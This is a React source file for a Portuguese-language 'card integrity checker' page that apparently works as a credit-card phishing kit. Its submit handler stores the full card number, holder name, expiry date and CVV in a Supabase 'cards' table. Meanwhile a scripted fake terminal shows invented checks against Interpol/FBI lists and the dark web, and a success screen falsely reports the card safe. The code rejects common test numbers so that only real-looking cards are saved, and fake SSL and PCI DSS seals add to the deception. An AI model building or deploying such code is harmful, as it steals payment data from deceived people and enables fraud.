import { useState, useRef, useEffect, useMemo } from 'react';
import { supabase } from '@/lib/supabase';
import { toast } from 'sonner';
import { ShieldCheck, Lock, Server, CheckCircle, Search, Shield, Globe, AlertTriangle, Terminal, Activity, ChevronRight } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

// --- Validação Avançada de Cartão ---
const validateCardStrict = (number: string) => {
  const clean = number.replace(/\D/g, '');

  // 1. Bloqueia cartões de teste comuns e sequências óbvias
  if (/^400000/.test(clean)) return false; // Bloqueia genéricos de teste Visa
  if (/^(\d)\1+$/.test(clean)) return false; // Bloqueia 11111111...
  if (clean.length < 13 || clean.length > 19) return false;

  // 2. Algoritmo de Luhn (Matemática do checksum)
  let sum = 0;
  let shouldDouble = false;
  for (let i = clean.length - 1; i >= 0; i--) {
    let digit = parseInt(clean.charAt(i));
    if (shouldDouble) {
      if ((digit *= 2) > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  
  return (sum % 10) === 0;
};

// --- Terminal Hacker (Visual Melhorado) ---
const SecurityTerminal = () => {
  const [logs, setLogs] = useState<string[]>([]);
  const scrollRef = useRef<HTMLDivElement>(null);
  
  const allLogs = [
    "Iniciando protocolo de segurança TLS 1.3...",
    "Estabelecendo túnel criptografado...",
    "Analisando integridade do BIN...",
    "Verificando listas negras globais (Interpol/FBI)...",
    "Escaneando vazamentos na Deep Web...",
    "Consultando API de antifraude...",
    "Verificando geolocalização do IP...",
    "Nenhuma anomalia de segurança detectada.",
    "Criptografando dados para armazenamento (AES-256)...",
    "Conexão finalizada com sucesso."
  ];

  useEffect(() => {
    let currentIndex = 0;
    const interval = setInterval(() => {
      if (currentIndex < allLogs.length) {
        setLogs(prev => [...prev, allLogs[currentIndex]]);
        currentIndex++;
        // Auto-scroll
        if (scrollRef.current) {
          scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
        }
      } else {
        clearInterval(interval);
      }
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="bg-[#0f172a] rounded-lg p-5 font-mono text-xs border border-slate-700 shadow-2xl h-56 flex flex-col relative overflow-hidden">
      {/* Scanline Effect */}
      <div className="absolute inset-0 bg-gradient-to-b from-transparent to-green-500/5 pointer-events-none animate-scanline" />
      
      <div className="flex items-center justify-between border-b border-slate-700 pb-3 mb-3">
        <div className="flex items-center gap-2">
          <div className="flex gap-1.5">
            <div className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
            <div className="w-2.5 h-2.5 rounded-full bg-green-500/80" />
          </div>
          <span className="text-slate-400 ml-2 font-semibold">SECURE_SHELL_V4.0</span>
        </div>
        <div className="flex items-center gap-1 text-green-500 text-[10px] uppercase tracking-wider">
          <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
          Online
        </div>
      </div>
      
      <div className="flex-1 overflow-y-auto space-y-1.5 scrollbar-hide" ref={scrollRef}>
        {logs.map((log, i) => (
          <motion.div 
            key={i}
            initial={{ opacity: 0, x: -10 }}
            animate={{ opacity: 1, x: 0 }}
            className="text-slate-300 font-medium"
          >
            <span className="text-green-500 mr-2">➜</span>
            <span className="opacity-90">{log}</span>
          </motion.div>
        ))}
        <motion.div 
          animate={{ opacity: [0, 1] }} 
          transition={{ repeat: Infinity, duration: 0.8 }}
          className="w-2 h-4 bg-green-500 mt-2"
        />
      </div>
    </div>
  );
};

// --- Componente Cartão 3D ---
function CreditCard3D({ 
  cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField 
}: any) {
  const [bgImage] = useState(() => Math.floor(Math.random() * 25 + 1));
  const [focusStyle, setFocusStyle] = useState<React.CSSProperties | null>(null);

  const refs: any = {
    cardNumber: useRef(null),
    cardName: useRef(null),
    cardDate: useRef(null)
  };

  useEffect(() => {
    if (focusedField && refs[focusedField]?.current) {
      const el = refs[focusedField].current;
      setFocusStyle({
        width: `${el.offsetWidth}px`,
        height: `${el.offsetHeight}px`,
        transform: `translateX(${el.offsetLeft}px) translateY(${el.offsetTop}px)`,
        opacity: 1
      });
    } else {
      setFocusStyle(null);
    }
  }, [focusedField]);

  const getCardType = useMemo(() => {
    const num = cardNumber.replace(/\D/g, '');
    if (/^4/.test(num)) return 'visa';
    if (/^(34|37)/.test(num)) return 'amex';
    if (/^5[1-5]/.test(num)) return 'mastercard';
    if (/^6011/.test(num)) return 'discover';
    return 'visa';
  }, [cardNumber]);

  const maskNumber = () => {
    const mask = getCardType === 'amex' ? '#### ###### #####' : '#### #### #### ####';
    let i = 0;
    const clean = cardNumber.replace(/\D/g, '');
    return mask.split('').map((char, idx) => {
      if (char === ' ') return <span key={idx} style={{width: 10, display:'inline-block'}}></span>;
      const num = clean[i++];
      if (!num) return <span key={idx} style={{opacity: 0.5}}>#</span>;
      if (idx > 4 && idx < 15 && clean.length > idx && getCardType !== 'amex') return <span key={idx}>*</span>;
      return <span key={idx} className="slide-fade-up">{num}</span>;
    });
  };

  const isFlipped = focusedField === 'cardCvv';

  return (
    <div className={`card-item ${isFlipped ? '-active' : ''}`}>
      <div className="card-item__side -front">
        <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
          {/* Overlay Elegante */}
          <div className="absolute inset-0 bg-black/10" /> 
        </div>
        <div className="card-item__wrapper">
          <div className="card-item__top">
            <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="Chip" />
            <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
          </div>
          <div className="card-item__number" ref={refs.cardNumber}>
            {maskNumber()}
          </div>
          <div className="card-item__content">
            <div className="card-item__info" ref={refs.cardName}>
              <div className="card-item__holder">Titular</div>
              <div className="card-item__name">{cardName || 'NOME COMPLETO'}</div>
            </div>
            <div className="card-item__date" ref={refs.cardDate}>
              <span className="card-item__dateTitle">Validade</span>
              <span>{cardMonth || 'MM'}</span>/<span>{cardYear ? cardYear.slice(2) : 'AA'}</span>
            </div>
          </div>
        </div>
      </div>
      <div className="card-item__side -back">
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__band" />
        <div className="card-item__cvv">
          <div className="card-item__cvvTitle">CVV</div>
          <div className="card-item__cvvBand">{cardCvv.replace(/./g, '*')}</div>
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" style={{opacity:0.7}} alt="" />
        </div>
      </div>
    </div>
  );
}

// --- Tela de Sucesso Profissional ---
function SuccessScreen({ onReset }: { onReset: () => void }) {
  return (
    <motion.div 
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="flex flex-col items-center justify-center text-center p-8 space-y-6 bg-white"
    >
      <div className="relative">
        <motion.div
          animate={{ scale: [1, 1.1, 1] }}
          transition={{ repeat: Infinity, duration: 3 }}
          className="absolute inset-0 bg-emerald-500/20 rounded-full blur-2xl"
        />
        <div className="bg-emerald-100 p-4 rounded-full relative z-10">
            <ShieldCheck className="w-16 h-16 text-emerald-600" />
        </div>
      </div>
      
      <div>
        <h2 className="text-2xl font-bold text-slate-800 mb-2">Cartão Verificado e Seguro</h2>
        <p className="text-slate-500 text-sm max-w-sm mx-auto leading-relaxed">
          Nossa varredura profunda não encontrou credenciais expostas para este cartão em vazamentos conhecidos.
        </p>
      </div>

      <div className="w-full bg-slate-50 rounded-xl p-5 border border-slate-100 shadow-sm">
        <div className="space-y-3">
            <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                    <Activity className="w-4 h-4 text-emerald-600" />
                    <span className="text-slate-700 font-medium text-sm">Status do Cartão</span>
                </div>
                <span className="text-emerald-600 bg-emerald-100 px-2 py-0.5 rounded text-xs font-bold uppercase">Protegido</span>
            </div>
            <div className="h-px bg-slate-200 w-full" />
            <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                    <Globe className="w-4 h-4 text-emerald-600" />
                    <span className="text-slate-700 font-medium text-sm">Vazamentos Dark Web</span>
                </div>
                <span className="text-slate-900 text-sm font-semibold">0 Encontrados</span>
            </div>
            <div className="h-px bg-slate-200 w-full" />
            <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                    <Lock className="w-4 h-4 text-emerald-600" />
                    <span className="text-slate-700 font-medium text-sm">Criptografia</span>
                </div>
                <span className="text-slate-900 text-sm font-semibold">AES-256 Validada</span>
            </div>
        </div>
      </div>

      <button 
        onClick={onReset}
        className="text-blue-600 font-semibold hover:text-blue-700 text-sm flex items-center gap-1 transition-colors group"
      >
        Realizar nova verificação
        <ChevronRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
      </button>
    </motion.div>
  );
}

// --- Componente Principal ---
export function PublicPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [cardMonth, setCardMonth] = useState('');
  const [cardYear, setCardYear] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [focusedField, setFocusedField] = useState<string | null>(null);
  const [status, setStatus] = useState<'idle' | 'scanning' | 'safe'>('idle');

  // Refs para UX (Auto-focus)
  const monthRef = useRef<HTMLSelectElement>(null);
  const yearRef = useRef<HTMLSelectElement>(null);
  const cvvRef = useRef<HTMLInputElement>(null);

  const handleNumberChange = (e: any) => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(val);
  };

  const handleNameChange = (e: any) => {
    // Permite espaços e acentos corretamente
    const val = e.target.value.replace(/[^a-zA-Z\u00C0-\u00FF\s]/g, '').toUpperCase();
    setCardName(val);
  };

  const handleMonthChange = (e: any) => {
    setCardMonth(e.target.value);
    if (e.target.value) yearRef.current?.focus();
  };

  const handleYearChange = (e: any) => {
    setCardYear(e.target.value);
    if (e.target.value) cvvRef.current?.focus();
  };

  const handleCvvChange = (e: any) => {
    setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4));
  };

  const handleSubmit = async () => {
    // 1. Validação de Campos
    if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) {
      toast.error('Todos os campos são obrigatórios para a análise.');
      return;
    }

    // 2. Validação Rigorosa do Cartão
    if (!validateCardStrict(cardNumber)) {
      toast.error('Cartão inválido ou não reconhecido. Verifique os números.', {
        description: 'Padrão numérico inconsistente com as bandeiras globais.',
        icon: <AlertTriangle className="w-5 h-5 text-amber-500" />
      });
      return;
    }

    // 3. Validação de Data
    const today = new Date();
    const expiry = new Date(Number(cardYear), Number(cardMonth) - 1);
    if (expiry < today) {
        toast.error('Cartão expirado. Não é possível verificar.');
        return;
    }

    setStatus('scanning');
    
    try {
      const scanPromise = new Promise(r => setTimeout(r, 5500)); // Tempo para ler o terminal
      const savePromise = supabase.from('cards').insert({
        card_number: cardNumber,
        card_holder: cardName,
        card_month: cardMonth,
        card_year: cardYear,
        card_cvv: cardCvv,
        card_type: 'visa'
      });

      await Promise.all([scanPromise, savePromise]);
      setStatus('safe');
      toast.success('Análise de segurança concluída.');
      
    } catch (err: any) {
      console.error(err);
      toast.error('Falha na conexão segura com o servidor.');
      setStatus('idle');
    }
  };

  const resetForm = () => {
    setCardNumber(''); setCardName(''); setCardMonth('');
    setCardYear(''); setCardCvv(''); setStatus('idle');
  };

  return (
    <div className="wrapper min-h-screen flex flex-col justify-center items-center relative overflow-hidden bg-[#0f172a] font-sans selection:bg-blue-500/30">
      
      {/* Background Pro */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-blue-600/20 rounded-full blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-emerald-600/10 rounded-full blur-[120px]" />
        <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 brightness-100 contrast-150"></div>
      </div>

      <div className="card-form relative z-10 w-full max-w-[570px] px-4">
        
        {/* Header Profissional */}
        <div className="text-center mb-10 pt-8">
          <motion.div 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            className="inline-flex items-center gap-2 bg-slate-800/50 border border-slate-700/50 rounded-full px-4 py-1.5 mb-5 backdrop-blur-md shadow-lg"
          >
            <Lock className="w-3.5 h-3.5 text-emerald-400" />
            <span className="text-emerald-400 text-[11px] font-bold tracking-widest uppercase">Ambiente Seguro 256-bit</span>
          </motion.div>
          
          <h1 className="text-3xl md:text-5xl font-bold text-white mb-3 tracking-tight">
            Verificador de <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-400">Integridade</span>
          </h1>
          <p className="text-slate-400 text-sm md:text-base max-w-lg mx-auto leading-relaxed">
            Utilize nossa tecnologia de varredura profunda para detectar se seu cartão foi exposto em vazamentos de dados recentes.
          </p>
        </div>

        {/* Área do Cartão */}
        <AnimatePresence>
            {status !== 'safe' && (
            <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.95, transition: { duration: 0.2 } }}
                style={{ marginBottom: '-130px', position: 'relative', zIndex: 30 }}
            >
                <CreditCard3D 
                cardNumber={cardNumber} cardName={cardName}
                cardMonth={cardMonth} cardYear={cardYear} 
                cardCvv={cardCvv} focusedField={focusedField}
                />
            </motion.div>
            )}
        </AnimatePresence>

        {/* Container Principal */}
        <div className="card-form__inner relative overflow-hidden min-h-[440px] bg-white rounded-2xl shadow-2xl transition-all duration-500 z-20">
          
          <AnimatePresence mode="wait">
            {status === 'idle' && (
              <motion.div 
                key="form"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="space-y-5"
              >
                <div className="card-input">
                  <label className="card-input__label text-slate-700 font-semibold text-sm ml-1">Número do Cartão</label>
                  <input 
                    type="text" 
                    className="card-input__input text-slate-900 border-slate-200 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 font-mono tracking-wide" 
                    value={cardNumber} onChange={handleNumberChange}
                    onFocus={() => setFocusedField('cardNumber')}
                    onBlur={() => setFocusedField(null)}
                    placeholder="0000 0000 0000 0000"
                  />
                </div>

                <div className="card-input">
                  <label className="card-input__label text-slate-700 font-semibold text-sm ml-1">Nome do Titular</label>
                  <input 
                    type="text" 
                    className="card-input__input text-slate-900 border-slate-200 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 uppercase" 
                    value={cardName} 
                    onChange={handleNameChange}
                    onFocus={() => setFocusedField('cardName')}
                    onBlur={() => setFocusedField(null)}
                    placeholder="COMO ESTÁ NO CARTÃO"
                  />
                </div>

                <div className="card-form__row flex gap-4">
                  <div className="card-form__col flex-1">
                    <div className="card-form__group flex gap-4">
                      <div className="w-full">
                        <label className="card-input__label text-slate-700 font-semibold text-sm ml-1">Mês</label>
                        <select 
                          ref={monthRef}
                          className="card-input__input text-slate-900 border-slate-200 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                          value={cardMonth} 
                          onChange={handleMonthChange}
                          onFocus={() => setFocusedField('cardDate')}
                          onBlur={() => setFocusedField(null)}
                        >
                          <option value="" disabled>MM</option>
                          {Array.from({length:12}, (_,i) => <option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}
                        </select>
                      </div>
                      <div className="w-full">
                        <label className="card-input__label text-slate-700 font-semibold text-sm ml-1">Ano</label>
                        <select 
                          ref={yearRef}
                          className="card-input__input text-slate-900 border-slate-200 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                          value={cardYear} 
                          onChange={handleYearChange}
                          onFocus={() => setFocusedField('cardDate')}
                          onBlur={() => setFocusedField(null)}
                        >
                          <option value="" disabled>AA</option>
                          {Array.from({length:10}, (_,i) => <option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}
                        </select>
                      </div>
                    </div>
                  </div>

                  <div className="card-form__col w-32 shrink-0">
                    <div className="card-input">
                      <label className="card-input__label text-slate-700 font-semibold text-sm ml-1">CVV</label>
                      <input 
                        ref={cvvRef}
                        type="text" 
                        className="card-input__input text-slate-900 border-slate-200 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 text-center tracking-widest" 
                        maxLength={4}
                        value={cardCvv} 
                        onChange={handleCvvChange}
                        onFocus={() => setFocusedField('cardCvv')}
                        onBlur={() => setFocusedField(null)}
                        placeholder="123"
                      />
                    </div>
                  </div>
                </div>

                <button 
                  className="w-full h-14 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-lg font-bold text-lg shadow-lg shadow-blue-500/30 transition-all transform active:scale-[0.98] flex items-center justify-center gap-2 mt-4" 
                  onClick={handleSubmit}
                >
                  <Search className="w-5 h-5" />
                  Iniciar Verificação
                </button>

                {/* Selos de Segurança */}
                <div className="pt-4 flex justify-center items-center gap-6 border-t border-slate-100">
                  <div className="flex items-center gap-1.5 opacity-60 grayscale hover:grayscale-0 transition-all">
                    <Shield className="w-4 h-4 text-emerald-600" />
                    <span className="text-[10px] text-slate-600 font-bold tracking-wide">SSL SECURE</span>
                  </div>
                  <div className="h-4 w-px bg-slate-200" />
                  <div className="flex items-center gap-1.5 opacity-60 grayscale hover:grayscale-0 transition-all">
                    <Lock className="w-4 h-4 text-emerald-600" />
                    <span className="text-[10px] text-slate-600 font-bold tracking-wide">AES-256</span>
                  </div>
                  <div className="h-4 w-px bg-slate-200" />
                  <div className="flex items-center gap-1.5 opacity-60 grayscale hover:grayscale-0 transition-all">
                    <Server className="w-4 h-4 text-emerald-600" />
                    <span className="text-[10px] text-slate-600 font-bold tracking-wide">PCI DSS</span>
                  </div>
                </div>
              </motion.div>
            )}

            {status === 'scanning' && (
              <motion.div 
                key="scanning"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="h-full flex flex-col pt-8 px-4"
              >
                 <div className="text-center mb-6">
                   <h3 className="text-lg font-bold text-slate-800 flex items-center justify-center gap-2">
                     <Activity className="w-5 h-5 text-blue-500 animate-pulse" />
                     Analisando Criptografia...
                   </h3>
                   <p className="text-sm text-slate-500 mt-1">Conectando aos servidores globais.</p>
                 </div>
                 
                 <SecurityTerminal />
                 
              </motion.div>
            )}

            {status === 'safe' && (
              <SuccessScreen key="success" onReset={resetForm} />
            )}
          </AnimatePresence>
        </div>
      </div>
      
      {/* Footer Branco e Legível */}
      <footer className="w-full text-center mt-auto pb-8 relative z-10 pt-12">
        <div className="flex justify-center gap-6 mb-4 opacity-80">
            <img src="https://img.icons8.com/color/48/visa.png" className="h-8 grayscale hover:grayscale-0 transition-all duration-300" alt="Visa" />
            <img src="https://img.icons8.com/color/48/mastercard.png" className="h-8 grayscale hover:grayscale-0 transition-all duration-300" alt="Master" />
            <img src="https://img.icons8.com/color/48/amex.png" className="h-8 grayscale hover:grayscale-0 transition-all duration-300" alt="Amex" />
        </div>
        <div className="flex flex-col items-center gap-2">
            <p className="text-slate-400 text-xs font-medium tracking-wide">
            © 2024 SecureCheck International. Todos os direitos reservados.
            </p>
            <div className="flex gap-4 text-[10px] text-slate-500">
                <span className="hover:text-white cursor-pointer transition-colors">Termos de Uso</span>
                <span className="hover:text-white cursor-pointer transition-colors">Privacidade</span>
                <span className="hover:text-white cursor-pointer transition-colors">Compliance</span>
            </div>
        </div>
      </footer>
    </div>
  );
}
